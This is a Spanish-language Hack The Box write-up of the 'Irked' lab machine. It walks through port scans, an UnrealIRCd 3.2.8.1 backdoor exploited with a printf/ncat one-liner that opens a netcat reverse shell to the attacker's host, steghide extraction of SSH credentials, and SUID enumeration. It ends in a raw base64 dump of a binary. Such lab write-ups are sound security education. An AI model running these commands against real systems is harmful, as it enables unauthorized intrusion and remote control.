---
title: "HTB write-up: Irked"
date: 2019-04-27T19:02:31-05:00
description: "Irked is the type of machine that you just not found in the wild. Anyway, it was fun!"
tags: ["hackthebox", "htb", "boot2root", "pentesting", "ctf", "stego", "pwn"]
categories: ["htb", "pentesting"]

---

Esta maquina fue particularmente divertida. Un exploit simple y poderoso, una escalacion de www-data a user muy al estilo de un CTF stego y nuevamente otra escalación de user a root con estilo CTF rev/pwn.

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![irked image](https://www.hackthebox.eu/storage/avatars/5fb846e75cf0db0c4b27e2dc64a9bf82_thumb.png) [irked](https://www.hackthebox.eu/home/machines/profile/163) | [MrAgent](https://www.hackthebox.eu/home/users/profile/624) | Linux | 10.10.10.117 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-irked/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.117
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:13 CST
Initiating Ping Scan at 11:13
Scanning 10.10.10.117 [4 ports]
Completed Ping Scan at 11:13, 0.42s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:13
Scanning 10.10.10.117 [65535 ports]
Discovered open port 111/tcp on 10.10.10.117
Discovered open port 22/tcp on 10.10.10.117
Discovered open port 80/tcp on 10.10.10.117
Discovered open port 54944/tcp on 10.10.10.117
Discovered open port 8067/tcp on 10.10.10.117
Discovered open port 6697/tcp on 10.10.10.117
Discovered open port 65534/tcp on 10.10.10.117
Nmap scan report for 10.10.10.117
Host is up (0.21s latency).
Not shown: 65527 closed ports, 1 filtered port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
54944/tcp open  unknown
65534/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 196.35 seconds
           Raw packets sent: 205740 (9.053MB) | Rcvd: 185243 (7.410MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Continuemos con el doblecheck usando `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.117

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 18:55:46 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 65534/tcp on 10.10.10.117
Discovered open port 22/tcp on 10.10.10.117
Discovered open port 6697/tcp on 10.10.10.117
Discovered open port 8067/tcp on 10.10.10.117
Discovered open port 80/tcp on 10.10.10.117
Discovered open port 111/tcp on 10.10.10.117
Discovered open port 59319/tcp on 10.10.10.117
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sV -sC -n -v -p22,80,111,6697,8067,54944,65534 10.10.10.117
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-02 09:26 CST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:26
Completed NSE at 09:26, 0.00s elapsed
Initiating NSE at 09:26
Completed NSE at 09:26, 0.00s elapsed
Initiating Ping Scan at 09:26
Scanning 10.10.10.117 [4 ports]
Completed Ping Scan at 09:26, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:26
Scanning 10.10.10.117 [7 ports]
Discovered open port 80/tcp on 10.10.10.117
Discovered open port 22/tcp on 10.10.10.117
Discovered open port 111/tcp on 10.10.10.117
Discovered open port 6697/tcp on 10.10.10.117
Discovered open port 8067/tcp on 10.10.10.117
Discovered open port 65534/tcp on 10.10.10.117
Completed SYN Stealth Scan at 09:26, 0.22s elapsed (7 total ports)
Initiating Service scan at 09:26
Scanning 6 services on 10.10.10.117
Service scan Timing: About 66.67% done; ETC: 09:30 (0:01:18 remaining)
Completed Service scan at 09:29, 156.22s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.10.117.
Initiating NSE at 09:29
Completed NSE at 09:30, 60.03s elapsed
Initiating NSE at 09:30
Completed NSE at 09:30, 1.23s elapsed
Nmap scan report for 10.10.10.117
Host is up (0.17s latency).

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open   http        Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open   rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33373/tcp  status
|_  100024  1          35024/udp  status
6697/tcp  open   ircs-u?
|_irc-info: Unable to open connection
8067/tcp  open   infi-async?
|_irc-info: Unable to open connection
54944/tcp closed unknown
65534/tcp open   unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.52 seconds
           Raw packets sent: 11 (460B) | Rcvd: 8 (344B)
```

IRC its that you?

Ok, tenemos varios servicios interesantes:

- TCP/22: OpenSSH 6.7p1
- TCP/80: Apache 2.4.10
- TCP/6697 y TCP/8097: IRC?

Comencemos por enumerar el servicio de Apache:

# Exploring TCP/80

Lanzamos un `httpie` hacia la dirección y veamos su respuesta:

```text
xbytemx@laptop:~/htb/irked$ http 10.10.10.117
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 83
Content-Type: text/html
Date: Tue, 02 Apr 2019 15:57:01 GMT
ETag: "48-56c2e413aa86b-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 14 May 2018 18:00:02 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding

<img src=irked.jpg>
<br>
<b><center>IRC is almost working!</b></center>
```

Parece que no hay mucho aquí. Excepto por la referencia de algo que parece inminente entre el nombre de la maquina y los primeros puertos descubiertos.

# Exploring TCP/6697

Para conectarme al servidor no usaremos nada fancy, con *tinyirc* basta:

```text
xbytemx@laptop:~/htb/irked$ tinyirc xbytemx 10.10.10.117 6697
TinyIRC 1.1 Copyright (C) 1991-1996 Nathan Laredo
This is free software with ABSOLUTELY NO WARRANTY.
For details please see the file COPYING.
*** User is xbytemx
*** trying port 6697 of 10.10.10.117
-irked.htb- *** Looking up your hostname...
-irked.htb- *** Couldn't resolve your hostname; using your IP address instead
001 Welcome to the ROXnet IRC Network xbytemx!xbytemx@10.10.14.141
002 Your host is irked.htb, running version Unreal3.2.8.1
003 This server was created Mon May 14 2018 at 13:12:50 EDT
004 irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
005 UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
005 WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
005 EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported by this server
251 There are 1 users and 3 invisible on 1 servers
254 1 channels formed
255 I have 4 clients and 0 servers
265 Current Local Users: 4  Max: 4
266 Current Global Users: 4  Max: 4
422 MOTD File is missing
*** xbytemx changed xbytemx to: +iwx
= LIST
321 Channel Users  Name
322 #UPupDOWNdownLRlrBAbaSSss 1
323 End of /LIST
= JOIN #UPupDOWNdownLRlrBAbaSSss
*** Now talking in #UPupDOWNdownLRlrBAbaSSss
353 = #UPupDOWNdownLRlrBAbaSSss xbytemx @djmardov
366 #UPupDOWNdownLRlrBAbaSSss End of /NAMES list.
324 #UPupDOWNdownLRlrBAbaSSss +
*** #UPupDOWNdownLRlrBAbaSSss formed Wed Apr  3 09:09:50 2019
```

Tenemos conectado al usuario djmardov en el único canal #UPupDOWNdownLRlrBAbaSSss. El servidor es un Unreal3.2.8.1

# Getting a RCE

Fuera de eso no encontramos nada mas relevante. Pero con esto basta para buscar si hay algun exploit conocido:

```text
xbytemx@laptop:~/git/exploit-database$ ./searchsploit unrealirc
------------------------------------------------------------------------------- -------------------------------------------------------
 Exploit Title                                                                 |  Path
                                                                               | (/home/xbytemx/git/exploit-database//)
------------------------------------------------------------------------------- -------------------------------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                   | exploits/linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                        | exploits/windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                 | exploits/linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                      | exploits/windows/dos/27407.pl
------------------------------------------------------------------------------- -------------------------------------------------------
Shellcodes: No Result
```

Encontramos varias opciones para la versión `3.2.8.1`, pero la que nos interesa es la que usa msf, veamos un poco que hace para lanzar el exploit:

```ruby
def exploit
  connect

  print_status("Connected to #{rhost}:#{rport}...")
  banner = sock.get_once(-1, 30)
  banner.to_s.split("\n").each do |line|
    print_line("    #{line}")
  end

  print_status("Sending backdoor command...")
  sock.put("AB;" + payload.encoded + "\n")

  handler
  disconnect
end
```

Como podemos ver a simple vista, concatena el string "AB; " con el payload encodeado. Esto es fácilmente replicable usando `printf`, por lo que abriré una primera shell donde ejecute la prueba del _backdoor command execution_ y otra donde dejare un sniffer para validar.

**Shell1:**

```text
xbytemx@laptop:~/htb/irked$ printf "AB;ping -c2 10.10.14.141\n" | ncat 10.10.10.117 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irked.htb 451 AB;ping :You have not registered
ERROR :Closing Link: [10.10.14.141] (Client exited)
^C
xbytemx@laptop:~/htb/irked$
```

**Shell2:**

```text
xbytemx@laptop:~/htb/irked$ tshark -i tun0 'icmp'
Capturing on 'tun0'
    1 0.000000000 10.10.10.117 → 10.10.14.141 ICMP 84 Echo (ping) request  id=0x0486, seq=1/256, ttl=63
    2 1.002996264 10.10.10.117 → 10.10.14.141 ICMP 84 Echo (ping) request  id=0x0486, seq=2/512, ttl=63
^C2 packets captured
xbytemx@laptop:~/htb/irked$
```

Perfecto, con esto podemos preparar una reverse shell para conectarnos:

**Shell1**
```text
xbytemx@laptop:~/htb/irked$ printf "AB; nc -e /bin/sh 10.10.14.141 3001\n" | ncat 10.10.10.117 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
```

Esperamos en el listener:

**Shell2**
```text
xbytemx@laptop:~/htb/irked$ ncat -vnlp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.117.
Ncat: Connection from 10.10.10.117:54960.
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
python -c 'import pty; pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$
```

Hemos accedido como el usuario ircd.

# Privesc from irc to djmardov

Hemos accedido como el usuario ircd, pero aun no capturamos la user.txt, eso significa que debemos movernos a otro usuario, veamos que tenemos por aquí:

```text
ircd@irked:~/Unreal3.2$ cd ..
lscd ..
ircd@irked:~$
ls
Unreal3.2
ircd@irked:~$ ls -lah
ls -lah
total 24K
drwxr-xr-x  4 ircd root 4.0K Apr  3 16:52 .
drwxr-xr-x  4 root root 4.0K May 14  2018 ..
-rw-------  1 ircd ircd  455 Apr  3 16:56 .bash_history
-rw-r--r--  1 ircd ircd    0 May 14  2018 .bashrc
-rw-r--r--  1 ircd ircd   66 May 14  2018 .selected_editor
drwx------  2 ircd ircd 4.0K Apr  3 16:52 .ssh
drwx------ 13 ircd ircd 4.0K Apr  3 16:44 Unreal3.2
ircd@irked:~/Unreal3.2$ ls -lah /home
ls -lah /home
total 16K
drwxr-xr-x  4 root     root     4.0K May 14  2018 .
drwxr-xr-x 21 root     root     4.0K May 15  2018 ..
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 djmardov
drwxr-xr-x  3 ircd     root     4.0K May 15  2018 ircd
```

Ahora que hemos identificado al otro usuario (djmardov el del irc) revisemos que tenemos en su home:

```text
ircd@irked:~/Unreal3.2$ ls -lahR /home/djmardov
ls -lahR /home/djmardov
/home/djmardov:
total 92K
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 .
drwxr-xr-x  4 root     root     4.0K May 14  2018 ..
lrwxrwxrwx  1 root     root        9 Nov  3 04:26 .bash_history -> /dev/null
-rw-r--r--  1 djmardov djmardov  220 May 11  2018 .bash_logout
-rw-r--r--  1 djmardov djmardov 3.5K May 11  2018 .bashrc
drwx------ 13 djmardov djmardov 4.0K May 15  2018 .cache
drwx------ 15 djmardov djmardov 4.0K May 15  2018 .config
drwx------  3 djmardov djmardov 4.0K May 11  2018 .dbus
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 Desktop
drwxr-xr-x  2 djmardov djmardov 4.0K May 15  2018 Documents
drwxr-xr-x  2 djmardov djmardov 4.0K May 14  2018 Downloads
drwx------  3 djmardov djmardov 4.0K Nov  3 04:40 .gconf
drwx------  2 djmardov djmardov 4.0K May 15  2018 .gnupg
-rw-------  1 djmardov djmardov 4.6K Nov  3 04:40 .ICEauthority
drwx------  3 djmardov djmardov 4.0K May 11  2018 .local
drwx------  4 djmardov djmardov 4.0K May 11  2018 .mozilla
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 Music
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 Pictures
-rw-r--r--  1 djmardov djmardov  675 May 11  2018 .profile
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 Public
drwx------  2 djmardov djmardov 4.0K Apr  3 17:03 .ssh
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 Templates
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 Videos
ls: cannot open directory /home/djmardov/.cache: Permission denied
ls: cannot open directory /home/djmardov/.config: Permission denied
ls: cannot open directory /home/djmardov/.dbus: Permission denied

/home/djmardov/Desktop:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..

/home/djmardov/Documents:
total 16K
drwxr-xr-x  2 djmardov djmardov 4.0K May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt

/home/djmardov/Downloads:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 14  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..
ls: cannot open directory /home/djmardov/.gconf: Permission denied
ls: cannot open directory /home/djmardov/.gnupg: Permission denied
ls: cannot open directory /home/djmardov/.local: Permission denied
ls: cannot open directory /home/djmardov/.mozilla: Permission denied

/home/djmardov/Music:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..

/home/djmardov/Pictures:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..

/home/djmardov/Public:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..
ls: cannot open directory /home/djmardov/.ssh: Permission denied

/home/djmardov/Templates:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..

/home/djmardov/Videos:
total 8.0K
drwxr-xr-x  2 djmardov djmardov 4.0K May 11  2018 .
drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..
```

En resumen, no tenemos acceso a algunas de sus carpetas y archvos, pero confirmamos la existencia de user.txt y que hay un archivo `.backup` que si podemos leer.

```text
ircd@irked:~/Unreal3.2$ cat /home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

DJmardov nos dice que la password de un "Super elite steg" es UPupDOWNdownLRlrBAbaSSss (el mismo nombre del único canal en el irc), pero si recordamos no había ninguna imagen o audio donde podamos aplicar esta contraseña, a menos que...

```text
xbytemx@laptop:~/htb/irked$ http 10.10.10.117
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 83
Content-Type: text/html
Date: Thu, 04 Apr 2019 00:02:34 GMT
ETag: "48-56c2e413aa86b-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 14 May 2018 18:00:02 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding

<img src=irked.jpg>
<br>
<b><center>IRC is almost working!</b></center>
```

Ahí había una imagen, así que descargemosla para revisarla.

```text
xbytemx@laptop:~/htb/irked$ wget 10.10.10.117/irked.jpg
--2019-04-03 18:02:45--  http://10.10.10.117/irked.jpg
Conectando con 10.10.10.117:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 34697 (34K) [image/jpeg]
Grabando a: “irked.jpg”

irked.jpg                         100%[============================================================>]  33.88K  93.9KB/s    en 0.4s

2019-04-03 18:02:46 (93.9 KB/s) - “irked.jpg” guardado [34697/34697]
```

Ok, normalmente en los retos de CTF y en algunas maquinas de HTB, se usa `steghide` para ocultar cosas, así que siguiendo esa mecánica usemos la misma herramienta.

```text
xbytemx@laptop:~/htb/irked$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
anot� los datos extra�dos e/"pass.txt".
xbytemx@laptop:~/htb/irked$ cat pass.txt
Kab6h+m+bbp2J:HG
```

- `extract` para indicar que queremos extraer
- `-sf` para indicar el archivo que tiene aplicado una técnica de esteganografía
- `-p` para la contraseña que sirve para ocultar el archivo

Parece que finalmente tenemos una contraseña, o al menos el nombre del archivo dice pass, así que validemos.

```text
xbytemx@laptop:~/htb/irked$ ssh djmardov@10.10.10.117
djmardov@10.10.10.117's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Wed Apr  3 20:04:44 2019 from 10.10.15.118
djmardov@irked:~$
```

Perfecto, ya hemos pasado de ircd a djmardov.

> creds: djmardov / Kab6h+m+bbp2J:HG

# cat user.txt

```text
djmardov@irked:~$ cat Documents/user.txt
```

# Privesc from djmardov to root

Después de enumerar un poco, cuando busque archivos con SETUID, me llama la atención algo en particular:

```text
djmardov@irked:/dev/shm$ find /usr/ -perm /4000
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
```

Ese archivo viewuser no se me hacia conocido de ningun lugar, inclusive lo busque dentro de los repos de debian:

```text
xbytemx@laptop:~/htb/irked$ apt-file search /usr/bin/viewuser
xbytemx@laptop:~/htb/irked$
```

Ahora, si ese archivo fue compilado y entregado en la maquina, podremos encontrar ciertos indicadores:

```text
djmardov@irked:/dev/shm$ ls -lah /usr/bin/viewuser
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser
```

Mejor copiemoslo y revisemos su funcionamiento por afuera. En mi caso la copia la hago vía base64 por lo que no transmito nada sobre la red y garantizo integridad:

```text
djmardov@irked:/dev/shm$ base64 /usr/bin/viewuser
f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAQAQAADQAAADwFwAAAAAAADQAIAAJACgAHgAdAAYAAAA0
AAAANAAAADQAAAAgAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUAQAAVAEAABMAAAATAAAABAAAAAEA
AAABAAAAAAAAAAAAAAAAAAAAHAgAABwIAAAFAAAAABAAAAEAAAD0DgAA9B4AAPQeAAAwAQAANAEA
AAYAAAAAEAAAAgAAAPwOAAD8HgAA/B4AAPAAAADwAAAABgAAAAQAAAAEAAAAaAEAAGgBAABoAQAA
RAAAAEQAAAAEAAAABAAAAFDldGQABwAAAAcAAAAHAAA0AAAANAAAAAQAAAAEAAAAUeV0ZAAAAAAA
AAAAAAAAAAAAAAAAAAAABgAAABAAAABS5XRk9A4AAPQeAAD0HgAADAEAAAwBAAAEAAAAAQAAAC9s
aWIvbGQtbGludXguc28uMgAABAAAABAAAAABAAAAR05VAAAAAAADAAAAAgAAAAAAAAAEAAAAFAAA
AAMAAABHTlUAabpLx1v3IDfx7EkrxM3iVQ7qxLsCAAAACQAAAAEAAAAFAAAAACAAIAAAAAAJAAAA
rUvjwAAAAAAAAAAAAAAAAAAAAABkAAAAAAAAAAAAAAAgAAAALQAAAAAAAAAAAAAAIgAAACEAAAAA
AAAAAAAAABIAAAAmAAAAAAAAAAAAAAASAAAAgAAAAAAAAAAAAAAAIAAAADwAAAAAAAAAAAAAABIA
AAAaAAAAAAAAAAAAAAASAAAAjwAAAAAAAAAAAAAAIAAAAAsAAAB8BgAABAAAABEAEAAAbGliYy5z
by42AF9JT19zdGRpbl91c2VkAHNldHVpZABwdXRzAHN5c3RlbQBfX2N4YV9maW5hbGl6ZQBfX2xp
YmNfc3RhcnRfbWFpbgBHTElCQ18yLjAAR0xJQkNfMi4xLjMAX0lUTV9kZXJlZ2lzdGVyVE1DbG9u
ZVRhYmxlAF9fZ21vbl9zdGFydF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAAAAAAACAAMA
AwAAAAMAAwAAAAEAAAABAAIAAQAAABAAAAAAAAAAEGlpDQAAAwBOAAAAEAAAAHMfaQkAAAIAWAAA
AAAAAAD0HgAACAAAAPgeAAAIAAAA+B8AAAgAAAAgIAAACAAAAOwfAAAGAQAA8B8AAAYCAAD0HwAA
BgUAAPwfAAAGCAAADCAAAAcDAAAQIAAABwQAABQgAAAHBgAAGCAAAAcHAABTg+wI6LsAAACBwzsc
AACLg/T///+FwHQF6F4AAACDxAhbwwD/swQAAAD/owgAAAAAAAAA/6MMAAAAaAAAAADp4P////+j
EAAAAGgIAAAA6dD/////oxQAAABoEAAAAOnA/////6MYAAAAaBgAAADpsP////+j8P///2aQ/6P0
////ZpAx7V6J4YPk8FBUUugiAAAAgcOwGwAAjYNg5v//UI2DAOb//1BRVv+z+P///+if////9Isc
JMNmkGaQZpBmkGaQixwkw2aQZpBmkGaQZpBmkOjkAAAAgcJrGwAAjYokAAAAjYIkAAAAOch0HYuC
7P///4XAdBNVieWD7BRR/9CDxBDJw5CNdCYA88ONtgAAAADopAAAAIHCKxsAAFWNiiQAAACNgiQA
AAApyInlU8H4AonDg+wEwesfAdjR+HQUi5L8////hdJ0CoPsCFBR/9KDxBCLXfzJw4n2jbwnAAAA
AFWJ5VPoV////4HD1xoAAIPsBIC7JAAAAAB1J4uD8P///4XAdBGD7Az/syAAAADo3f7//4PEEOg1
////xoMkAAAAAYtd/MnDifaNvCcAAAAAVYnlXelX////ixQkw41MJASD5PD/cfxVieVTUejv/v//
gcNvGgAAg+wMjYOA5v//UOhK/v//g8QQg+wMjYPI5v//UOg4/v//g8QQg+wMjYPt5v//UOg2/v//
g8QQg+wMagDoSf7//4PEEIPsDI2D8eb//1DoF/7//4PEELgAAAAAjWX4WVtdjWH8w2aQZpCQVVdW
U+h3/v//gcP3GQAAg+wMi2wkKI2z+P7//+ib/f//jYP0/v//KcbB/gKF9nQlMf+NtgAAAACD7ARV
/3QkLP90JCz/lLv0/v//g8cBg8QQOf5144PEDFteX13DjXYA88MAAFOD7AjoE/7//4HDkxkAAIPE
CFvDAwAAAAEAAgBUaGlzIGFwcGxpY2F0aW9uIGlzIGJlaW5nIGRldmxlb3BlZCB0byBzZXQgYW5k
IHRlc3QgdXNlciBwZXJtaXNzaW9ucwAAAABJdCBpcyBzdGlsbCBiZWluZyBhY3RpdmVseSBkZXZl
bG9wZWQAd2hvAC90bXAvbGlzdHVzZXJzAAEbAzswAAAABQAAAOD8//9MAAAAMP3//3AAAAB9/v//
hAAAAAD///+4AAAAYP///wQBAAAUAAAAAAAAAAF6UgABfAgBGwwEBIgBAAAgAAAAHAAAAIz8//9Q
AAAAAA4IRg4MSg8LdAR4AD8aOyoyJCIQAAAAQAAAALj8//8QAAAAAAAAADAAAABUAAAA8f3//34A
AAAARAwBAEcQBQJ1AEQPA3V4BhADAnV8AmnBDAEAQcNBxUMMBARIAAAAiAAAAED+//9dAAAAAEEO
CIUCQQ4MhwNBDhCGBEEOFIMFTg4gaQ4kQQ4oRA4sRA4wTQ4gRw4UQcMOEEHGDgxBxw4IQcUOBAAA
EAAAANQAAABU/v//AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
